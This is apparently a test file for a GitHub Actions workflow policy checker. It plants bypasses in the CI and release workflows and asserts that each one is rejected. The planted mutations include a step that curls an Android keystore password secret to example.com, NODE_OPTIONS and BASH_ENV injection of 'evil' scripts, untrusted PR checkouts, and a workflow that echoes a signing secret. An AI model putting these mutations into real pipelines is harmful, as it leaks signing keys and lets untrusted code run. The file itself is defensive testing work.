      checks.replace('          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node', '          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n      - name: Use the pinned Node'),
      /with: must be exactly/,
    ],
    [
      'required checkout pr head',
      'checks.yml',
      checks.replace('          ref: main\n          persist-credentials: false\n          fetch-depth: 1', '          ref: ${{ github.event.pull_request.head.sha }}\n          persist-credentials: false\n          fetch-depth: 1'),
      /with: must be exactly/,
    ],
    [
      'policy checkout fork repository',
      'checks.yml',
      checks.replace('          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node', '          repository: ${{ github.event.pull_request.head.repo.full_name }}\n          ref: main\n          persist-credentials: false\n      - name: Use the pinned Node'),
      /with: must be exactly/,
    ],
    [
      'required checkout moved path',
      'checks.yml',
      checks.replace('          ref: main\n          persist-credentials: false\n          fetch-depth: 1', '          ref: main\n          path: trusted\n          persist-credentials: false\n          fetch-depth: 1'),
      /with: must be exactly/,
    ],
    ['PR_TREE workspace', 'checks.yml', checks.replace(/          PR_TREE: .*\n/, '          PR_TREE: ${{ github.workspace }}\n'), /env: must be exactly/],
    [
      'gate step condition',
      'checks.yml',
      checks.replace('      - name: Workflow policy and privacy on the candidate tree\n        env:', "      - name: Workflow policy and privacy on the candidate tree\n        if: false\n        env:"),
      /condition must be|must not set if/,
    ],
    // A2-V3/F6: env injection at every level.
    ['workflow NODE_OPTIONS', 'checks.yml', checks.replace('permissions:\n', 'env:\n  NODE_OPTIONS: --require ./pr/scripts/evil.cjs\npermissions:\n'), /workflow env must not set NODE_OPTIONS/],
    ['job BASH_ENV', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    env:\n      BASH_ENV: ./pr/scripts/evil.sh\n'), /job "policy" env must not set BASH_ENV/],
    [
      'step GITHUB_OUTPUT',
      'checks.yml',
      checks.replace('        env:\n          PR_TREE:', '        env:\n          GITHUB_OUTPUT: ./pr/out\n          PR_TREE:'),
      /step env must not set GITHUB_OUTPUT/,
    ],
    // A2-V4/V5: the worktree and the upload path.
    ['materialize main', RELEASE_FILE, release.replace('git worktree add --detach "$worktree" "$REF"', 'git worktree add --detach "$worktree" main'), /must materialize "\$REF"/],
    [
      'HEAD step removed',
      RELEASE_FILE,
      release.replace(/- name: Prove the worktree is the resolved commit[\s\S]*?run: test "\$\(git rev-parse HEAD\)" = "\$SHA"\n/, ''),
      /must run exactly these commands|must have exactly/,
    ],
    [
      'HEAD step moved out of the worktree',
      RELEASE_FILE,
      release.replace(
        '        working-directory: ${{ env.RELEASE_TREE }}\n        run: test "$(git rev-parse HEAD)" = "$SHA"',
        '        run: test "$(git rev-parse HEAD)" = "$SHA"'
      ),
      /must run .*git rev-parse HEAD.* in the resolved worktree/,
    ],
    ['upload dist/*', RELEASE_FILE, release.replace('          path: ${{ env.RELEASE_TREE }}/dist/*', '          path: dist/*'), /upload path must be exactly/],
    // A2-V6: source in sign and publish.
    ['sign source', RELEASE_FILE, release.replace("          trap 'rm -f", '          . dist/notes.md\n          trap \'rm -f'), /must not source a file/],
    [
      'publish source',
      RELEASE_FILE,
      release.replace('          for file in "$apk" "$checksum" "$bundle" "$notes"; do test -f "$file"; done', '          . "$notes"\n          for file in "$apk" "$checksum" "$bundle" "$notes"; do test -f "$file"; done'),
      /must not source a file/,
    ],
    // F5: trusted step shape.
    [
      'policy extra step',
      'checks.yml',
      checks.replace(
        '      - name: Workflow policy and privacy on the candidate tree',
        '      - name: Replace the parser\n        run: cp pr/scripts/check-workflows.mjs scripts/check-workflows.mjs\n      - name: Workflow policy and privacy on the candidate tree'
      ),
      /must have exactly 6 steps/,
    ],
    [
      'policy working-directory',
      'checks.yml',
      checks.replace('      - name: Workflow policy and privacy on the candidate tree\n        env:', '      - name: Workflow policy and privacy on the candidate tree\n        working-directory: pr\n        env:'),
      /must not set working-directory/,
    ],
    ['policy defaults', 'checks.yml', checks.replace('  policy:\n', "  policy:\n    defaults:\n      run:\n        shell: bash -c 'exit 0' {0}\n"), /must not declare defaults/],
    ['policy container', 'checks.yml', checks.replace('  policy:\n', '  policy:\n    container: node:22\n'), /must not declare container/],
    ['workflow defaults', 'checks.yml', checks.replace('permissions:\n', "defaults:\n  run:\n    shell: bash -c 'exit 0' {0}\npermissions:\n"), /workflow-level defaults/],
    // F10: exact conditions.
    [
      'resolve if or true',
      RELEASE_FILE,
      release.replace("       github.event.workflow_run.conclusion == 'success')", "       github.event.workflow_run.conclusion == 'success') || true"),
      /job "resolve" if: must be exactly/,
    ],
    [
      'publish if dispatch',
      RELEASE_FILE,
      release.replace("    if: needs.resolve.outputs.publish == 'true'\n    runs-on: ubuntu-24.04", "    if: needs.resolve.outputs.publish == 'true' || github.event_name == 'workflow_dispatch'\n    runs-on: ubuntu-24.04"),
      /job "publish" if: must be exactly/,
    ],
    // F11: the tag source.
    ['publish tag ref_name', RELEASE_FILE, release.replace('      TAG: ${{ needs.resolve.outputs.tag }}\n      VERSION:', '      TAG: ${{ github.ref_name }}\n      VERSION:'), /env TAG must be exactly/],
    ['publish tag literal', RELEASE_FILE, release.replace('      TAG: ${{ needs.resolve.outputs.tag }}\n      VERSION:', '      TAG: v1.0.2\n      VERSION:'), /env TAG must be exactly/],
    // F12: permissions.
    ['checks contents write', 'checks.yml', checks.replace('permissions:\n  contents: read', 'permissions:\n  contents: write'), /top-level permissions must be exactly/],
    ['required permissions write', 'checks.yml', checks.replace('  required:\n', '  required:\n    permissions:\n      contents: write\n'), /job "required" permissions must be exactly/],
    [
      'web github token',
      'checks.yml',
      checks.replace('      - name: Privacy gate\n        run: npm run privacy:check', '      - name: Privacy gate\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: npm run privacy:check'),
      /must not read github.token/,
    ],
    // F13: publish command allowlist.
    [
      'publish upload clobber',
      RELEASE_FILE,
      release.replace('          gh release create "$TAG" \\', '          gh release upload "$TAG" dist/x --clobber\n          gh release create "$TAG" \\'),
      /must not run gh release upload/,
    ],
    [
      'publish gh api',
      RELEASE_FILE,
      release.replace('          gh release create "$TAG" \\', '          gh api -X DELETE "repos/$GITHUB_REPOSITORY/releases/1"\n          gh release create "$TAG" \\'),
      /may only run gh release/,
    ],
    // A3-23: the attestation must carry the custom predicate, not a step env.
    [
      'attestation predicate path removed',
      RELEASE_FILE,
      release.replace('          predicate-path: dist/provenance.json\n', ''),
      /attest step must pass predicate-path/,
    ],
    [
      'attestation GITHUB_SHA restored',
      RELEASE_FILE,
      release.replace(
        '        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n        with:',
        '        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n        env:\n          GITHUB_SHA: ${{ needs.resolve.outputs.sha }}\n        with:'
      ),
      /must not override GITHUB_SHA/,
    ],
    [
      'predicate built from a literal commit',
      RELEASE_FILE,
      release.replace('--sha "$SHA" --tag "$TAG"', `--sha "${'c'.repeat(40)}" --tag "$TAG"`),
      /must run exactly these commands/,
    ],
    [
      'provenance step removed',
      RELEASE_FILE,
      release.replace(/      - name: Write the provenance predicate[\s\S]*?--out dist\/provenance\.json\n/, ''),
      /must run exactly these commands|must have exactly/,
    ],
    // F14: concurrency.
    ['checks release group', 'checks.yml', checks.replace('  group: checks-${{ github.workflow }}-${{ github.ref }}', '  group: release'), /concurrency group must be exactly/],
    // N8: the runner image.
    ['required windows', 'checks.yml', checks.replace('  required:\n    name: required\n    if: always()', '  required:\n    name: required\n    runs-on: windows-latest\n    if: always()').replace('    runs-on: ubuntu-24.04\n    timeout-minutes: 5', '    timeout-minutes: 5'), /must run on ubuntu-24.04/],
    ['policy macos', 'checks.yml', checks.replace('  policy:\n    name: policy (trusted gate)\n    runs-on: ubuntu-24.04', '  policy:\n    name: policy (trusted gate)\n    runs-on: macos-latest'), /must run on ubuntu-24.04/],
  ];
  for (const [name, file, text, pattern] of cases) {
    assert.notEqual(text, file === 'checks.yml' ? checks : release, `${name}: the mutation applies`);
    const findings = checkWorkflow(text, { file });
    const releaseFindings = file === RELEASE_FILE ? checkReleaseWorkflow(text, { file }) : [];
    assert.ok(
      [...findings, ...releaseFindings].some((finding) => pattern.test(finding)),
      `${name}: ${[...findings, ...releaseFindings].join(' | ')}`
    );
    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
  }
  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
});

test('every injection variable is rejected at job level', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  for (const key of INJECTION_KEYS) {
    const text = checks.replace('  policy:\n', `  policy:\n    env:\n      ${key}: /tmp/evil\n`);
    assert.ok(
      checkWorkflow(text, { file: 'checks.yml' }).some((finding) => finding.includes(`must not set ${key}`)),
      `${key} is rejected`
    );
    assert.notEqual(await runPolicy(t, { ...files, 'checks.yml': text }), 0, `${key}: the CLI exits nonzero`);
  }
  assert.equal(await runPolicy(t, files), 0, 'the real tree sets none of them');
});

test('the release parser reads one real publish command and rejects decoys', async () => {
  const files = await real();
  const release = files[RELEASE_FILE];
  assert.deepEqual(checkReleaseWorkflow(release, { file: RELEASE_FILE }), []);

  const publishes = publishCommands(release);
  assert.equal(publishes.length, 1, 'one publish command');
  const tokens = publishes[0].split(/\s+/);
  assert.ok(tokens.includes('--verify-tag'), 'the flag is on the real command');
  assert.ok(tokens.includes('"$TAG"'), 'the tag is the resolved TAG, not GITHUB_REF_NAME');
  assert.ok(!publishes[0].includes('GITHUB_REF_NAME'));

  const noFlag = release.replace('            --verify-tag \\\n', '');
  assert.ok(
    checkReleaseWorkflow(noFlag, { file: RELEASE_FILE }).some((finding) => /--verify-tag on the gh release create command/.test(finding))
  );

  const decoy = noFlag.replace('          gh release create "$TAG"', '          echo --verify-tag\n          gh release create "$TAG"');
  const decoyFindings = checkReleaseWorkflow(decoy, { file: RELEASE_FILE });
  assert.ok(decoyFindings.some((finding) => /only on the gh release create command/.test(finding)), decoyFindings.join(' | '));
  assert.ok(decoyFindings.some((finding) => /--verify-tag on the gh release create command/.test(finding)), decoyFindings.join(' | '));

  const quoted = release.replace('          gh release create "$TAG"', '          "gh" release create "$TAG"');
  assert.ok(
    checkReleaseWorkflow(quoted, { file: RELEASE_FILE }).some((finding) => /command name must not be quoted/.test(finding))
  );

  const assembled = release.replace('            --verify-tag \\\n', '').replace('          gh release create "$TAG"', '          args+=(--verify-tag)\n          gh release create "$TAG"');
  assert.ok(
    checkReleaseWorkflow(assembled, { file: RELEASE_FILE }).some((finding) => /--verify-tag on the gh release create command/.test(finding)),
    'a flag collected in an array is not on the command'
  );
});

test('the release authority is main-defined, split and tag-derived', async () => {
  const files = await real();
  const release = files[RELEASE_FILE];
  const parsed = parseWorkflow(release).workflow;
  const resolve = parsed.jobs.resolve;
  const commands = resolve.steps.flatMap((step) => logicalCommands(step.run ?? '')).join('\n');
  assert.match(commands, /git tag --points-at "\$sha"/, 'the tag comes from the resolved commit');
  assert.doesNotMatch(commands, /head_branch/, 'a tag that points at main HEAD does not need head_branch');
  assert.match(commands, /git merge-base --is-ancestor/, 'ancestry is checked in the main-defined workflow');
  assert.match(commands, /package\.json/, 'the tag matches the package version');
  assert.match(commands, /publish=true requires a release tag/, 'a SHA dry run cannot publish');
  assert.match(commands, /40-character SHA/, 'a short SHA is refused with a clear message');
  assert.equal(resolve.environment, undefined, 'the resolve job has no environment');
  assert.deepEqual(Object.keys(resolve.outputs).sort(), ['publish', 'ref', 'sha', 'tag', 'version']);
  assert.doesNotMatch(JSON.stringify(resolve), /gh release view/, 'resolve computes no dead existing release flag');
  const resolveIf = String(resolve.if).replace(/\s+/g, ' ');
  assert.match(resolveIf, /github\.event_name == 'workflow_dispatch'/, 'a manual dispatch is explicit');
  assert.match(resolveIf, /github\.event\.workflow_run\.event == 'push'/, 'a pull request Checks run cannot publish');
  assert.match(resolveIf, /github\.event\.workflow_run\.conclusion == 'success'/, 'a failed or cancelled tag run cannot publish');
  assert.match(resolveIf, /workflow_run\.event == 'push' && github\.event\.workflow_run\.conclusion == 'success'/);

  // Removing the guard (or half of it) is a policy finding.
  for (const mutated of [
    release.replace(/    if: >-\n      github\.event_name == 'workflow_dispatch' \|\|\n      \(github\.event\.workflow_run\.event == 'push' &&\n       github\.event\.workflow_run\.conclusion == 'success'\)\n/, ''),
    release.replace("github.event.workflow_run.conclusion == 'success'", "github.event.workflow_run.conclusion != 'never'"),
    release.replace("github.event.workflow_run.event == 'push'", "github.event.workflow_run.event != 'never'"),
  ]) {
    assert.ok(
      checkReleaseWorkflow(mutated, { file: RELEASE_FILE }).some((finding) => /job "resolve" must only run|must handle a manual dispatch|must require the push|job "resolve" if: must be exactly/.test(finding)),
      'the resolve trigger guard is mandatory'
    );
  }

  // A workflow_run with no tag stops cheaply after resolve.
  assert.match(commands, /out "publish=false"/);

  // The build has no secret and no environment. Its own checkout is main; the
  // resolved tag/SHA is materialized as a worktree, so the dynamic ref is data
  // for git rather than an actions/checkout target (the CodeQL cache-poisoning
  // pattern). The sign job still replaces the test signature.
  const build = parsed.jobs.build;
  assert.equal(build.environment, undefined);
  const buildText = JSON.stringify(build);
  assert.doesNotMatch(buildText, /secrets\./);
  assert.match(buildText, /needs\.resolve\.outputs\.ref/);
  const buildCheckout = build.steps.find((step) => String(step.uses ?? '').startsWith('actions/checkout@'));
  assert.equal(buildCheckout.with.ref, 'main', 'the build checks out the fixed main ref');
  const materialize = build.steps.find((step) => step.env?.REF === '${{ needs.resolve.outputs.ref }}');
  assert.ok(materialize, 'the resolved ref is materialized');
  assert.match(String(materialize.run), /git worktree add --detach/);
  assert.match(String(materialize.run), /RELEASE_TREE/);
  for (const name of [
    'Install the one dev-only dependency',
    'Gate the resolved tree',
    'Build the unsigned APK with a throwaway key',
    'The built APK matches its manifest and policy',
  ]) {
    const step = build.steps.find((entry) => entry.name === name);
    assert.equal(step['working-directory'], '${{ env.RELEASE_TREE }}', `${name} runs in the resolved worktree`);
  }

  // The sign job has the key and no repository code at all.
  const sign = parsed.jobs.sign;
  assert.equal(sign.environment, 'release');
  assert.doesNotMatch(JSON.stringify(sign.steps.map((step) => step.uses ?? '')), /actions\/checkout/);
  for (const step of sign.steps) {
    for (const command of logicalCommands(step.run ?? '')) {
      assert.doesNotMatch(command, /^(?:npm|node|npx)\b/, `sign must not execute repository code: ${command}`);
      assert.doesNotMatch(command, /scripts\//, `sign must not execute a repository script: ${command}`);
    }
  }
  assert.match(JSON.stringify(sign.env), /vars\.RELEASE_CERT_SHA256/);
  assert.match(JSON.stringify(sign.steps), /vars\.ANDROID_KEY_ALIAS/);
  assert.doesNotMatch(JSON.stringify(sign.steps), /secrets\.ANDROID_KEY_ALIAS/);
  // The signing toolchain is the same gate-proved JDK as the build.
  assert.ok(
    sign.steps.some((step) => step.uses === 'actions/setup-java@d1374f8ac74474200d16ef8ecee22c7ae7a51880' && step.with?.['java-version'] === '21')
  );
  // The signing scheme and the exact artifact identity come from the build's
  // one owners; the sign job does not hard-code a second answer.
  assert.match(JSON.stringify(sign), /--min-sdk-version \\"\$min_sdk\\"/);
  assert.match(JSON.stringify(sign), /--v1-signing-enabled \\"\$v1_signing\\"/);
  assert.doesNotMatch(JSON.stringify(sign), /--min-sdk-version 26/);
  assert.doesNotMatch(JSON.stringify(sign), /--v1-signing-enabled false/);
  assert.match(JSON.stringify(sign), /expected_version_code/);
  // The attestation is a custom predicate written by the build, not the
  // action's default github.context predicate; the downloaded bundle is
  // checked against the resolved commit.
  const attest = sign.steps.find((step) => String(step.uses ?? '').startsWith('actions/attest-build-provenance@'));
  assert.equal(attest.with['predicate-type'], 'https://slsa.dev/provenance/v1');
  assert.equal(attest.with['predicate-path'], 'dist/provenance.json');
  assert.equal(attest.env?.GITHUB_SHA, undefined, 'a step-level GITHUB_SHA is overwritten by GitHub');
  assert.ok(
    build.steps.some(
      (step) => step.name === 'Write the provenance predicate' && String(step.run ?? '').includes('release-provenance.mjs')
    ),
    'the build writes the predicate from the resolved SHA'
  );
  assert.ok(sign.steps.some((step) => String(step.run ?? '').includes('predicate.buildDefinition.resolvedDependencies')));

  // Publish holds contents: write and no secret, checks nothing out and uses TAG.
  const publish = parsed.jobs.publish;
  assert.deepEqual(publish.permissions, { contents: 'write' });
  assert.equal(publish.environment, undefined);
  assert.equal(publish.env.GH_REPO, '${{ github.repository }}', 'gh can resolve the repository without a checkout');
  assert.doesNotMatch(JSON.stringify(publish.steps.map((step) => step.uses ?? '')), /actions\/checkout/);
  assert.equal(publishCommands(release).length, 1);
  assert.ok(publishCommands(release)[0].includes('$TAG'));
  assert.ok(!release.includes('GITHUB_REF_NAME'), 'the release has no tag-name shortcut');
});

test('the release build proves a clean unsigned tree and the sign job proves the signature', async () => {
  const files = await real();
  const release = files[RELEASE_FILE];
  const checks = files['checks.yml'];
  assert.match(release, /npm run verify:all/);
  assert.match(release, /release-notes\.mjs --tag "\$TAG" --commit "\$SHA" --out dist\/notes\.md/);
  assert.match(release, /node scripts\/ci-keystore\.mjs/);
  assert.doesNotMatch(release, /ANDROID_ALLOW_TEST_KEY/);
  assert.match(release, /node scripts\/check-apk\.mjs/);
  assert.match(release, /git diff --exit-code/);
  assert.match(release, /git status --porcelain/);
  assert.match(release, /--min-sdk-version "\$min_sdk"/);
  assert.match(release, /--v1-signing-enabled "\$v1_signing"/);
  assert.doesNotMatch(release, /--min-sdk-version 26/);
  assert.doesNotMatch(release, /--v1-signing-enabled false/);
  assert.match(release, /--v2-signing-enabled true/);
  assert.match(release, /--v3-signing-enabled true/);
  assert.match(release, /zipalign" -c -v 4/);
  assert.match(release, /aapt2" dump badging/);
  assert.match(release, /aapt2" dump xmltree/);
  assert.match(release, /RELEASE_CERT_SHA256/);
  assert.match(release, /gh attestation download/);
  assert.match(release, /subject-path: dist\/drypoint-\$\{\{ needs\.resolve\.outputs\.version \}\}\.apk/, 'the signed APK is the subject');
  assert.match(release, /predicate-type: https:\/\/slsa\.dev\/provenance\/v1/, 'the attestation uses a custom SLSA predicate');
  assert.match(release, /predicate-path: dist\/provenance\.json/, 'the predicate comes from the build tree');
  assert.doesNotMatch(release, /GITHUB_SHA:/, 'a step-level GITHUB_SHA cannot bind the action context');
  assert.match(
    release,
    /release-provenance\.mjs --sha "\$SHA" --tag "\$TAG" --version "\$VERSION" --out dist\/provenance\.json/,
    'the build writes the predicate from the resolved SHA'
  );
  assert.match(release, /predicate\.buildDefinition\.resolvedDependencies/, 'the downloaded predicate is verified');
  assert.match(release, /gh release view "\$TAG"/);
  assert.match(release, /cmp -s/);
  assert.match(release, /already exists with these exact assets/);
  assert.match(release, /gh release edit "\$TAG" --notes-file "\$notes"/, 'a re-run refreshes a changed body');
  assert.match(release, /GH_REPO: \$\{\{ github\.repository \}\}/);
  assert.match(release, /dist\/version-code\.txt/);
  assert.match(release, /dist\/signing\.json/);
  // The gate's artifact check asserts the schemes; the release sign job has its
  // own workflow-owned assertions because it must not run this script with the
  // key in its environment.
  assert.match(checks, /--apksigner "\$ANDROID_HOME\/build-tools\/\$ANDROID_BUILD_TOOLS\/apksigner"/);
  assert.match(checks, /node scripts\/find-chrome\.mjs/);
  assert.match(release, /node scripts\/find-chrome\.mjs/);
  assert.doesNotMatch(checks, /command -v google-chrome/);
  assert.doesNotMatch(release, /command -v google-chrome/);
});

test('the policy job runs on pull requests, main and tags, and every leg runs on a tag', async () => {
  const checksText = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
  const parsed = parseWorkflow(checksText).workflow;
  assert.ok(parsed.on.push.tags.includes('v*'), 'Checks runs for a tag');
  assert.ok(parsed.on.push.branches.includes('main'), 'Checks runs for main');
  assert.ok(Object.hasOwn(parsed.on, 'pull_request'), 'Checks runs for pull requests');
  const policy = parsed.jobs.policy;
  assert.equal(policy.if, undefined, 'the policy job has no event filter');
  assert.deepEqual(jobNames(parsed), ['web', 'browser', 'android', 'policy', 'required']);
  assert.deepEqual(parsed.jobs.required.needs, ['web', 'browser', 'android', 'policy']);
  for (const name of parsed.jobs.required.needs) {
    const leg = parsed.jobs[name];
    assert.ok(leg, `${name} exists`);
    if (name === 'required') continue;
    assert.equal(leg.if, undefined, `${name} has no event filter that would skip a tag`);
  }
  // The only conditions in policy select which tree is data: PR or push. A tag
  // is a push, so the gate step still runs.
  const conditions = policy.steps.filter((step) => step.if != null).map((step) => step.if);
  assert.deepEqual(conditions.sort(), ["github.event_name == 'pull_request'", "github.event_name == 'push'"]);
  const gate = policy.steps.find((step) => String(step.run ?? '').includes('check-workflows.mjs --workflows'));
  assert.ok(gate, 'the gate step exists');
  assert.equal(gate.if, undefined, 'the gate step is not conditional');
  assert.match(gate.env.PR_TREE, /github\.event_name == 'push'/, 'a push (including a tag) parses the pushed tree');

  // The trusted copies: required and policy both check out main, never the PR.
  for (const name of ['required', 'policy']) {
    const checkout = parsed.jobs[name].steps.find((step) => String(step.uses ?? '').startsWith('actions/checkout@'));
    assert.equal(checkout.with.ref, 'main', `${name} runs main's scripts`);
    assert.equal(checkout.with['persist-credentials'], false);
  }
  const required = parsed.jobs.required;
  assert.equal(required.if, 'always()');
  const aggregate = required.steps.find((step) => String(step.run ?? '').includes('check-required.mjs'));
  assert.equal(aggregate.env.NEEDS, '${{ toJSON(needs) }}');

  // The aggregate passes when every leg (including policy) succeeds, whatever
  // the trigger; the script has no event knowledge by design.
  const allSuccess = JSON.stringify({ web: { result: 'success' }, browser: { result: 'success' }, android: { result: 'success' }, policy: { result: 'success' } });
  const run = join(projectRoot, 'scripts', 'check-required.mjs');
  assert.equal(
    execFileSync(process.execPath, [run], { env: { ...process.env, NEEDS: allSuccess }, encoding: 'utf8', stdio: 'pipe' }).trim(),
    'required: web, browser, android, policy all succeeded'
  );
});

test('the one Android toolchain list is shared by the script and the sign job', async () => {
  const script = await readFile(join(projectRoot, 'scripts', 'android-sdk.sh'), 'utf8');
  const releaseText = await readFile(join(projectRoot, WORKFLOW_DIR, RELEASE_FILE), 'utf8');
  const sign = parseWorkflow(releaseText).workflow.jobs.sign;
  const install = sign.steps.find((step) => String(step.run ?? '').includes('sdkmanager'));
  assert.ok(install, 'the sign job installs the SDK inline');
  const packages = (text) => [...text.matchAll(/"(?:platforms|build-tools);\$\{ANDROID_[A-Z_]+\}"/g)].map((match) => match[0]).sort();
  assert.deepEqual(packages(install.run), packages(script), 'the sign job package list equals android-sdk.sh');
  assert.match(script, /platforms;\$\{ANDROID_PLATFORM\}/);
  assert.match(script, /build-tools;\$\{ANDROID_BUILD_TOOLS\}/);
  for (const workflow of ['checks.yml', RELEASE_FILE]) {
    const text = await readFile(join(projectRoot, WORKFLOW_DIR, workflow), 'utf8');
    assert.match(text, /bash scripts\/android-sdk\.sh/, `${workflow} uses the one script where repository code runs`);
  }
});

test('every planted bypass exits nonzero and the real tree passes', async (t) => {
  const files = await real();
  const checks = files['checks.yml'];
  const release = files[RELEASE_FILE];
  const bypasses = {
    'anchor write-all': { 'checks.yml': checks.replace('permissions:\n  contents: read', 'env:\n  GRANT: &grant write-all\npermissions: *grant') },
    'folded write-all': { 'checks.yml': checks.replace('permissions:\n  contents: read', 'permissions: >-\n  write-all') },
    'tagged write-all': { 'checks.yml': checks.replace('permissions:\n  contents: read', 'permissions: !!str write-all') },
    'quoted job': {
      'checks.yml': checks.replace('  required:\n', '  "lint":\n    runs-on: ubuntu-24.04\n    steps:\n      - run: "true"\n\n  required:\n'),
    },
    'multiline uses': {
      'checks.yml': checks.replace(
        `uses: actions/checkout@${CHECKOUT_SHA}`,
        'uses:\n          actions/checkout@v4'
      ),
    },
    'or true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit || true') },
    'semicolon true': { 'checks.yml': checks.replace('run: npm run test:unit', 'run: npm run test:unit; true') },
    'dead if': {
      'checks.yml': checks.replace(
        '        run: node scripts/check-required.mjs',
        '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
      ),
    },
    'here-doc': {
      'checks.yml': checks.replace(
        '        run: node scripts/check-required.mjs',
        "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
      ),
    },
    'pipe cat': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat') },
    'path true': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true') },
    'environment release on web': { 'checks.yml': checks.replace('  web:\n', '  web:\n    environment: release\n') },
    'secret in a non-sign run': {
      'checks.yml': checks.replace(
        '      - name: Workflow policy and privacy on the candidate tree',
        '      - name: Exfiltrate\n        run: curl -s -d "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" https://example.com/\n      - name: Workflow policy and privacy on the candidate tree'
      ),
    },
    'local action in policy': {
      'checks.yml': checks.replace(
        '      - name: Workflow policy and privacy on the candidate tree',
        '      - name: Evil\n        uses: ./pr/.evil\n      - name: Workflow policy and privacy on the candidate tree'
      ),
    },
    'second release workflow': {
      'release.yaml': `name: Release Again\non:\n  workflow_run:\n    workflows: [Checks]\n    types: [completed]\npermissions:\n  contents: write\nconcurrency:\n  group: release\n  cancel-in-progress: false\njobs:\n  sign:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    environment: release\n    steps:\n      - run: echo "\${{ secrets.ANDROID_KEYSTORE_BASE64 }}"\n`,
    },
    'continue-on-error': {
      'checks.yml': checks.replace(
        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
        '      - name: Unit test suite (the browser suites have their own job)\n        continue-on-error: true\n        run: npm run test:unit'
      ),
    },
    echo: { 'checks.yml': checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"') },
    'no-op aggregate': { 'checks.yml': checks.replace('run: node scripts/check-required.mjs', 'run: exit 0') },
    'policy skips tags': { 'checks.yml': checks.replace('  policy:\n', "  policy:\n    if: github.event_name == 'pull_request'\n") },
    'duplicate key': {
      'checks.yml': checks.replace('permissions:\n  contents: read', 'permissions:\n  contents: read\npermissions:\n  contents: read'),
    },
    'syntax error': { 'checks.yml': 'name: broken\non: [\n' },
    'publish without verify-tag': { [RELEASE_FILE]: release.replace('            --verify-tag \\\n', '') },
    'publish decoy': {
      [RELEASE_FILE]: release
        .replace('            --verify-tag \\\n', '')
        .replace('          gh release create "$TAG"', '          echo --verify-tag\n          gh release create "$TAG"'),
    },
    'quoted gh': { [RELEASE_FILE]: release.replace('          gh release create "$TAG"', '          "gh" release create "$TAG"') },
    'release ref name': { [RELEASE_FILE]: release.replace('gh release download "$TAG"', 'gh release download "$GITHUB_REF_NAME"') },
    'build environment': {
      [RELEASE_FILE]: release.replace('    timeout-minutes: 30\n    permissions:', '    timeout-minutes: 30\n    environment: release\n    permissions:'),
    },
    'build dynamic checkout': {
      [RELEASE_FILE]: release.replace('          ref: main\n', '          ref: ${{ needs.resolve.outputs.ref }}\n'),
    },
    'build no worktree': {
      [RELEASE_FILE]: release.replace('          git worktree add --detach "$worktree" "$REF"\n', ''),
    },
    'build main tree': {
      [RELEASE_FILE]: release.replace('        working-directory: ${{ env.RELEASE_TREE }}\n        run: npm ci', '        run: npm ci'),
    },
    'sign repository code': {
      [RELEASE_FILE]: release.replace('          set -euo pipefail\n          tools="$ANDROID_HOME', '          set -euo pipefail\n          npm run verify:all\n          tools="$ANDROID_HOME'),
    },
  };
  for (const [name, replacement] of Object.entries(bypasses)) {
    const status = await runPolicy(t, { ...files, ...replacement });
    assert.notEqual(status, 0, `${name}: the policy CLI must exit nonzero`);
  }
  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
});

test('every workflow in the real tree satisfies the policy', async () => {
  const { findings, files } = await checkWorkflows();
  assert.deepEqual(findings, []);
  assert.deepEqual(files, [
    'actionlint.yml',
    'checks.yml',
    'codeql.yml',
    'dependency-review.yml',
    'pages.yml',
    RELEASE_FILE,
    'scorecard.yml',
    'stale.yml',
  ]);
});

test('the rule parser reads logical commands, not raw lines', () => {
  assert.deepEqual(logicalCommands('set -euo pipefail\ngit diff --exit-code'), ['set -euo pipefail', 'git diff --exit-code']);
  assert.equal(
    logicalCommands('gh release create \\\n  "$TAG" \\\n  --verify-tag')[0].replace(/\s+/g, ' '),
    'gh release create "$TAG" --verify-tag'
  );
  assert.deepEqual(logicalCommands('echo "# not a comment" # a comment'), ['echo "# not a comment"']);
  assert.deepEqual(logicalCommands('# --verify-tag\ngh release view "$TAG"'), ['gh release view "$TAG"']);
  assert.deepEqual(logicalCommands('npm run test:unit || true'), ['npm run test:unit', 'true']);
  assert.deepEqual(shellCommands('jobs:\n  x:\n    steps:\n      - run: test -z "$(git status --porcelain)"'), ['test -z "$(git status --porcelain)"']);
});

test('the pinned allowlist is exactly the briefed commits', () => {
  assert.deepEqual(PINNED_ACTIONS, {
    'actions/checkout': '3d3c42e5aac5ba805825da76410c181273ba90b1',
    'actions/setup-node': '949feb2413d6458794dcd2491c4babbbce0c15c1',
    'actions/setup-java': 'd1374f8ac74474200d16ef8ecee22c7ae7a51880',
    'actions/upload-artifact': 'cf430e030ddbb5b0abf93d22962f4752f3646cd9',
    'actions/download-artifact': '9000827ccba6bdab643e8b6fd33ac0654aef8333',
    'actions/attest-build-provenance': '4d101475d8b20a2381f78447822ac1eab6504dd8',
    'actions/dependency-review-action': 'a1d282b36b6f3519aa1f3fc636f609c47dddb294',
    'actions/configure-pages': '45bfe0192ca1faeb007ade9deae92b16b8254a0d',
    'actions/upload-pages-artifact': 'fc324d3547104276b827a68afc52ff2a11cc49c9',
    'actions/deploy-pages': '368f82528645a54fb793d4d04e342629a3f51346',
    'github/codeql-action': '33d7b85da1a04171e211befe2c739303b9a4c066',
